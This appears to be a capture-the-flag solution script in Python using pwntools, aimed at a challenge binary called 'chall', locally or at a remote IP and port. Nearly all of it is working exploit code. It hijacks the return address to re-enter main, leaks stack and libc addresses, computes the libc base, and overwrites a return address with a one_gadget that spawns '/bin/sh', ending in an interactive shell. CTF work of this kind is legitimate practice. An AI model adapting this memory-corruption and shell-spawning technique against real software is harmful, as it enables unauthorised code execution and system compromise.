#!/usr/bin/env python3
# Local Ubuntu 24.04

from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = "./chall"
elf  = ELF(BINARY, checksec=False)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "34.170.104.126"
  PORT = 5000
  s = remote(HOST, PORT)
  libc = ELF("./libc.so.6", checksec=False)
else:
  s = process(BINARY)
  libc = elf.libc  

def Get_addr(pos):
  addr = 0
  cnt = 0
  for j in range(6):
    p0 = pos + j
    s.recvuntil(p0.to_bytes())
    for i in range(0x100):
      b = s.recvn(1)
      cnt += 1 
      if b != p0.to_bytes():
        break
    addr += (cnt)<<(8*j)
    cnt = 1
  return addr

def Change_address(pos, before, after):
  buf = b""
  for i in range(3):
    p0 = pos + i
    c0 = ((after>>(8*i))&0xff) - ((before>>(8*i))&0xff)
    if c0 < 0:
      c0 += 0x100
    if i == 0:
      c0 -= 1  
    buf += p0.to_bytes()*c0
  return buf  
        
# Change return address to (main+5)
buf = b""
for i in range(0x10):
  a = 0xf0-i
  buf += a.to_bytes()
s.send(buf+b"\xe1"+b"\x08"*(0x1a5-0xbc))

# stack leak
stack_leak = Get_addr(0x10)
print("stack_leak =", hex(stack_leak))

# libc leak (__libc_start_call_main+122)
libc_leak = Get_addr(0x18)
libc_base = libc_leak - 0x2a1c9
print("libc_leak  =", hex(libc_leak))
print("libc_base  =", hex(libc_base))
s.recvuntil(b"\xfd")

one_gadget = libc_base + 0xef52b # 0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])

# Change __libc_start_call_main+122 => one_gadget
buf = b""
for i in range(0x10):
  a = 0xf0-i
  buf += a.to_bytes()
buf += b"\xe1"
buf += b"\x10"*0x50  # for [rbp-0x78] == NULL
buf += Change_address(0x18, libc_leak, one_gadget)
s.send(buf)
  
s.interactive()  
